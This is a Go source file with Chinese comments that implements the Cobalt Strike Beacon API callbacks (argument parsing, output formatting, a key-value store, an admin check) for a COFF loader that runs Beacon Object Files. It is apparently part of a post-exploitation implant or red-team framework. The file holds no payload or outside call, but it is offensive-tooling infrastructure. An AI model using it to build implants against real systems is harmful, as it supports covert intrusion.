//go:build windows && amd64

package coff

import (
	"fmt"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

const (
	cpACP             = 0    // 系统默认 ANSI 代码页
	mbErrInvalidChars = 0x8  // MultiByteToWideChar 标志
)

var (
	beaconStoreMu sync.Mutex
	beaconStore   = make(map[string]uintptr) // Beacon 全局键值存储
)

// bofRuntime 持有单次 COFF BOF 执行的上下文
type bofRuntime struct {
	output    chan<- interface{} // 输出通道
	stopEvent uintptr            // killjob 事件句柄
}

// beaconDataParser 对应 Cobalt Strike 的 datap 结构体
type beaconDataParser struct {
	Original uintptr // 原始 buffer 起始地址
	Buffer   uintptr // 当前读取位置
	Length   int32   // 剩余可读字节数
	Size     int32   // 初始数据大小
}

// beaconFormat 对应 Cobalt Strike 的 formatp 结构体
type beaconFormat struct {
	Original uintptr // 分配的 buffer 起始地址
	Buffer   uintptr // 当前写入位置
	Length   int32   // 已写入字节数
	Size     int32   // buffer 总大小
}

// resolveInternalAPI 将 Beacon API 名称映射为 syscall 回调
func resolveInternalAPI(symbolName string, rt *bofRuntime) uintptr {
	switch symbolName {
	case "BeaconOutput":
		return syscall.NewCallback(beaconOutputForRuntime(rt))
	case "BeaconPrintf":
		return syscall.NewCallback(beaconPrintfForRuntime(rt))
	case "BeaconDataInt":
		return syscall.NewCallback(beaconDataInt)
	case "BeaconDataShort":
		return syscall.NewCallback(beaconDataShort)
	case "BeaconDataParse":
		return syscall.NewCallback(beaconDataParse)
	case "BeaconDataExtract":
		return syscall.NewCallback(beaconDataExtract)
	case "BeaconDataLength":
		return syscall.NewCallback(beaconDataLength)
	case "BeaconFormatAlloc":
		return syscall.NewCallback(beaconFormatAlloc)
	case "BeaconFormatFree":
		return syscall.NewCallback(beaconFormatFree)
	case "BeaconFormatReset":
		return syscall.NewCallback(beaconFormatReset)
	case "BeaconFormatAppend":
		return syscall.NewCallback(beaconFormatAppend)
	case "BeaconFormatInt":
		return syscall.NewCallback(beaconFormatInt)
	case "BeaconFormatPrintf":
		return syscall.NewCallback(beaconFormatPrintf)
	case "BeaconFormatToString":
		return syscall.NewCallback(beaconFormatToString)
	case "BeaconGetStopJobEvent":
		return syscall.NewCallback(beaconGetStopJobEventForRuntime(rt))
	case "BeaconWakeup":
		return syscall.NewCallback(beaconWakeup)
	case "BeaconIsAdmin":
		return syscall.NewCallback(beaconIsAdmin)
	case "BeaconAddValue":
		return syscall.NewCallback(beaconAddValue)
	case "BeaconGetValue":
		return syscall.NewCallback(beaconGetValue)
	case "BeaconRemoveValue":
		return syscall.NewCallback(beaconRemoveValue)
	case "toWideChar":
		return syscall.NewCallback(toWideChar)
	}
	return 0
}

// beaconOutputForRuntime 返回绑定到特定 runtime 的 BeaconOutput 实现
func beaconOutputForRuntime(rt *bofRuntime) func(int, uintptr, int) uintptr {
	return func(beaconType int, data uintptr, length int) uintptr {
		if data == 0 || length <= 0 {
			return 0
		}
		if rt != nil && rt.output != nil {
			rt.output <- string(readBytes(data, length))
		}
		return 1
	}
}

// beaconPrintfForRuntime 返回绑定到特定 runtime 的 BeaconPrintf 实现
// 通过 renderCFormat 解析 C 风格格式化字符串
func beaconPrintfForRuntime(rt *bofRuntime) func(int, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr) uintptr {
	return func(beaconType int, data uintptr, arg0 uintptr, arg1 uintptr, arg2 uintptr, arg3 uintptr, arg4 uintptr, arg5 uintptr, arg6 uintptr, arg7 uintptr, arg8 uintptr, arg9 uintptr) uintptr {
		if data == 0 {
			return 0
		}
		if rt != nil && rt.output != nil {
			rt.output <- renderCFormat(readCString(data), []uintptr{arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9})
		}
		return 0
	}
}

// beaconDataParse 初始化参数解析器（跳过 4 字节总长度前缀）
func beaconDataParse(parser *beaconDataParser, buffer uintptr, size int32) uintptr {
	if parser == nil || buffer == 0 || size < 4 {
		return 0
	}
	parser.Original = buffer
	parser.Buffer = buffer + 4  // 跳过 4 字节总长度
	parser.Length = size - 4
	parser.Size = size - 4
	return 0
}

// beaconDataInt 读取一个 int 参数（4B 长度 + 4B 值 = 8B）
func beaconDataInt(parser *beaconDataParser) uintptr {
	if parser == nil || parser.Length < 8 {
		return 0
	}
	value := *(*uint32)(unsafe.Pointer(parser.Buffer + 4))
	parser.Buffer += 8
	parser.Length -= 8
	return uintptr(value)
}

// beaconDataShort 读取一个 short 参数（4B 长度 + 2B 值 = 6B）
func beaconDataShort(parser *beaconDataParser) uintptr {
	if parser == nil || parser.Length < 6 {
		return 0
	}
	value := *(*uint16)(unsafe.Pointer(parser.Buffer + 4))
	parser.Buffer += 6
	parser.Length -= 6
	return uintptr(value)
}

// beaconDataLength 返回剩余可读字节数
func beaconDataLength(parser *beaconDataParser) uintptr {
	if parser == nil {
		return 0
	}
	return uintptr(uint32(parser.Length))
}

// beaconDataExtract 提取一个带长度前缀的二进制块
func beaconDataExtract(parser *beaconDataParser, sizePtr uintptr) uintptr {
	if parser == nil || parser.Length < 4 {
		if sizePtr != 0 {
			*(*uint32)(unsafe.Pointer(sizePtr)) = 0
		}
		return 0
	}

	// 读取长度前缀
	length := *(*uint32)(unsafe.Pointer(parser.Buffer))
	parser.Buffer += 4
	parser.Length -= 4

	// 防御: 声称的长度超过剩余数据
	if length > uint32(parser.Length) {
		parser.Length = 0
		if sizePtr != 0 {
			*(*uint32)(unsafe.Pointer(sizePtr)) = 0
		}
		return 0
	}

	data := parser.Buffer
	parser.Buffer += uintptr(length)
	parser.Length -= int32(length)

	if sizePtr != 0 {
		*(*uint32)(unsafe.Pointer(sizePtr)) = length
	}
	return data
}

// beaconFormatAlloc 分配格式化 buffer
func beaconFormatAlloc(format *beaconFormat, maxSize int32) uintptr {
	if format == nil || maxSize <= 0 {
		return 0
	}
	ptr := heapAlloc(uintptr(maxSize))
	if ptr == 0 {
		return 0
	}
	format.Original = ptr
	format.Buffer = ptr
	format.Length = 0
	format.Size = maxSize
	return 0
}

// beaconFormatFree 释放格式化 buffer（先清零再释放）
func beaconFormatFree(format *beaconFormat) uintptr {
	if format == nil {
		return 0
	}
	if format.Original != 0 {
		zeroMemory(format.Original, int(format.Length))
		heapFree(format.Original)
	}
	format.Original = 0
	format.Buffer = 0
	format.Length = 0
	format.Size = 0
	return 0
}

// beaconFormatReset 重置格式化 buffer（清零并回到起始位置）
func beaconFormatReset(format *beaconFormat) uintptr {
	if format == nil || format.Original == 0 || format.Size <= 0 {
		return 0
	}
	zeroMemory(format.Original, int(format.Size))
	format.Buffer = format.Original
	format.Length = 0
	return 0
}

// beaconFormatAppend 追加原始字节到格式化 buffer
func beaconFormatAppend(format *beaconFormat, data uintptr, length int32) uintptr {
	if format == nil || format.Buffer == 0 || data == 0 || length <= 0 {
		return 0
	}
	if format.Length+length > format.Size {
		return 0 // buffer 满
	}
	copy((*[1 << 30]byte)(unsafe.Pointer(format.Buffer))[:length], readBytes(data, int(length)))
	format.Buffer += uintptr(length)
	format.Length += length
	return 0
}

// beaconFormatInt 写入大端序 32-bit 整数（Cobalt Strike 网络字节序）
func beaconFormatInt(format *beaconFormat, value int32) uintptr {
	if format == nil || format.Buffer == 0 || format.Length+4 > format.Size {
		return 0
	}
	out := uint32(value)
	// 字节序翻转: LE → BE
	swapped := (out>>24)&0xff | (out>>8)&0xff00 | (out<<8)&0xff0000 | (out<<24)&0xff000000
	*(*uint32)(unsafe.Pointer(format.Buffer)) = swapped
	format.Buffer += 4
	format.Length += 4
	return 0
}

// beaconFormatPrintf 格式化写入（解析 C 风格格式字符串）
func beaconFormatPrintf(format *beaconFormat, fmtPtr uintptr, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) uintptr {
	if format == nil || format.Buffer == 0 || fmtPtr == 0 {
		return 0
	}
	rendered := renderCFormat(readCString(fmtPtr), []uintptr{a0, a1, a2, a3, a4, a5, a6, a7, a8, a9})
	if format.Length+int32(len(rendered)) > format.Size {
		return 0
	}
	copy((*[1 << 30]byte)(unsafe.Pointer(format.Buffer))[:len(rendered)], []byte(rendered))
	format.Buffer += uintptr(len(rendered))
	format.Length += int32(len(rendered))
	// null-terminate
	if format.Length < format.Size {
		*(*byte)(unsafe.Pointer(format.Buffer)) = 0
	}
	return 0
}

// beaconFormatToString 返回 buffer 起始地址并写入长度
func beaconFormatToString(format *beaconFormat, sizePtr uintptr) uintptr {
	if format == nil {
		return 0
	}
	if sizePtr != 0 {
		*(*uint32)(unsafe.Pointer(sizePtr)) = uint32(format.Length)
	}
	if format.Buffer != 0 && format.Length < format.Size {
		*(*byte)(unsafe.Pointer(format.Buffer)) = 0
	}
	return format.Original
}

// beaconIsAdmin 检测是否以管理员权限运行（尝试打开物理磁盘）
func beaconIsAdmin() uintptr {
	h, err := syscall.Open("\\\\.\\PHYSICALDRIVE0", syscall.O_RDONLY, 0)
	if err != nil {
		return 0
	}
	_ = syscall.CloseHandle(h)
	return 1
}

// beaconGetStopJobEventForRuntime 返回绑定到 runtime 的 stop event 获取函数
func beaconGetStopJobEventForRuntime(rt *bofRuntime) func() uintptr {
	return func() uintptr {
		if rt == nil {
			return 0
		}
		return rt.stopEvent
	}
}

// beaconWakeup 唤醒操作（COFF 实现中为空操作）
func beaconWakeup() uintptr {
	return 0
}

// beaconAddValue 向全局键值存储中添加条目
func beaconAddValue(key uintptr, ptr uintptr) uintptr {
	name := readCString(key)
	beaconStoreMu.Lock()
	beaconStore[name] = ptr
	beaconStoreMu.Unlock()
	return 1
}

// beaconGetValue 从全局键值存储中获取条目
func beaconGetValue(key uintptr) uintptr {
	name := readCString(key)
	beaconStoreMu.Lock()
	value := beaconStore[name]
	beaconStoreMu.Unlock()
	return value
}

// beaconRemoveValue 从全局键值存储中删除条目
func beaconRemoveValue(key uintptr) uintptr {
	name := readCString(key)
	beaconStoreMu.Lock()
	_, ok := beaconStore[name]
	delete(beaconStore, name)
	beaconStoreMu.Unlock()
	if ok {
		return 1
	}
	return 0
}

// toWideChar 将 ANSI 字符串转换为 UTF-16 宽字符
func toWideChar(src uintptr, dst uintptr, max int32) uintptr {
	if src == 0 || dst == 0 || max < 2 {
		return 0
	}
	ret, _, _ := syscall.SyscallN(
		ldrAPI.MultiByteToWideChar,
		uintptr(cpACP),
		uintptr(mbErrInvalidChars),
		src,
		uintptr(^uint32(0)), // 自动计算源长度
		dst,
		uintptr(max/2),
	)
	return ret
}

// heapAlloc 从进程堆分配内存
func heapAlloc(size uintptr) uintptr {
	heap, _, _ := syscall.SyscallN(ldrAPI.GetProcessHeap)
	if heap == 0 {
		return 0
	}
	ptr, _, _ := syscall.SyscallN(ldrAPI.HeapAlloc, heap, 0x8, size) // HEAP_ZERO_MEMORY
	return ptr
}

// heapFree 释放进程堆内存
func heapFree(ptr uintptr) {
	if ptr == 0 {
		return
	}
	heap, _, _ := syscall.SyscallN(ldrAPI.GetProcessHeap)
	if heap != 0 {
		syscall.SyscallN(ldrAPI.HeapFree, heap, 0, ptr)
	}
}

// zeroMemory 将内存区域清零
func zeroMemory(ptr uintptr, size int) {
	if ptr == 0 || size <= 0 {
		return
	}
	buf := (*[1 << 30]byte)(unsafe.Pointer(ptr))[:size]
	for i := range buf {
		buf[i] = 0
	}
}

// readCString 从内存地址读取 null-terminated C 字符串
func readCString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	var b strings.Builder
	for offset := uintptr(0); ; offset++ {
		ch := *(*byte)(unsafe.Pointer(ptr + offset))
		if ch == 0 {
			break
		}
		b.WriteByte(ch)
	}
	return b.String()
}

// readWString 从内存地址读取 null-terminated UTF-16 宽字符串
func readWString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	var b strings.Builder
	for offset := uintptr(0); ; offset += 2 {
		ch := *(*uint16)(unsafe.Pointer(ptr + offset))
		if ch == 0 {
			break
		}
		b.WriteRune(rune(ch))
	}
	return b.String()
}

// readBytes 从内存地址拷贝指定长度的字节
func readBytes(ptr uintptr, length int) []byte {
	if ptr == 0 || length <= 0 {
		return nil
	}
	out := make([]byte, length)
	copy(out, (*[1 << 30]byte)(unsafe.Pointer(ptr))[:length])
	return out
}

// renderCFormat 解析 C 风格格式字符串并渲染为 Go 字符串。
// 支持: %d %i %u %x %X %p %s %S %c %ls %llu，以及宽度/长度修饰符。
func renderCFormat(format string, args []uintptr) string {
	var out strings.Builder
	argIndex := 0

	// nextArg 从参数列表中取下一个值
	nextArg := func() uintptr {
		if argIndex >= len(args) {
			return 0
		}
		arg := args[argIndex]
		argIndex++
		return arg
	}

	for i := 0; i < len(format); i++ {
		// 非 % 字符直接输出
		if format[i] != '%' || i == len(format)-1 {
			out.WriteByte(format[i])
			continue
		}

		i++
		// %% → %
		if format[i] == '%' {
			out.WriteByte('%')
			continue
		}

		// 跳过标志字符: 0 - + 空格 #
		for i < len(format) && strings.ContainsAny(format[i:i+1], "0-+ #") {
			i++
		}
		if i >= len(format) {
			break
		}

		// 处理宽度: * 或数字
		if format[i] == '*' {
			nextArg() // * 消耗一个参数
			i++
		} else {
			for i < len(format) && format[i] >= '0' && format[i] <= '9' {
				i++
			}
		}

		// 处理精度: .precision
		if i < len(format) && format[i] == '.' {
			i++
			if i < len(format) && format[i] == '*' {
				nextArg()
				i++
			} else {
				for i < len(format) && format[i] >= '0' && format[i] <= '9' {
					i++
				}
			}
		}

		// 处理长度修饰符: h hh l ll j z t L w I I64
		length := ""
		if i < len(format) {
			switch format[i] {
			case 'h', 'l':
				length = format[i : i+1]
				i++
				if i < len(format) && format[i:i+1] == length {
					length += format[i : i+1]
					i++
				}
			case 'j', 'z', 't', 'L', 'w':
				length = format[i : i+1]
				i++
			case 'I':
				start := i
				i++
				for i < len(format) && format[i] >= '0' && format[i] <= '9' {
					i++
				}
				length = format[start:i]
			}
		}
		if i >= len(format) {
			break
		}

		// 根据格式说明符渲染
		arg := nextArg()
		switch format[i] {
		case 's':
			if isWideStringFormat(length, format[i]) {
				out.WriteString(readWString(arg))
			} else {
				out.WriteString(readCString(arg))
			}
		case 'S':
			out.WriteString(readWString(arg))
		case 'd', 'i':
			if is64BitFormat(length) {
				out.WriteString(fmt.Sprintf("%d", int64(arg)))
			} else {
				out.WriteString(fmt.Sprintf("%d", int32(arg)))
			}
		case 'u':
			if is64BitFormat(length) {
				out.WriteString(fmt.Sprintf("%d", uint64(arg)))
			} else {
				out.WriteString(fmt.Sprintf("%d", uint32(arg)))
			}
		case 'x':
			if is64BitFormat(length) {
				out.WriteString(fmt.Sprintf("%x", uint64(arg)))
			} else {
				out.WriteString(fmt.Sprintf("%x", uint32(arg)))
			}
		case 'X':
			if is64BitFormat(length) {
				out.WriteString(fmt.Sprintf("%X", uint64(arg)))
			} else {
				out.WriteString(fmt.Sprintf("%X", uint32(arg)))
			}
		case 'p':
			out.WriteString(fmt.Sprintf("%x", unsafe.Pointer(arg)))
		case 'c':
			if isWideStringFormat(length, format[i]) {
				out.WriteRune(rune(uint16(arg)))
			} else {
				out.WriteByte(byte(arg))
			}
		default:
			out.WriteString(fmt.Sprintf("%%%c", format[i]))
		}
	}

	return out.String()
}

// isWideStringFormat 判断格式说明符是否为宽字符（%S / %ls / %lw）
func isWideStringFormat(length string, spec byte) bool {
	return spec == 'S' || strings.Contains(length, "l") || strings.Contains(length, "w")
}

// is64BitFormat 判断格式说明符是否为 64-bit（%ll / %j / %z / %t / %I64）
func is64BitFormat(length string) bool {
	return length == "ll" || length == "j" || length == "z" || length == "t" || length == "I64"
}
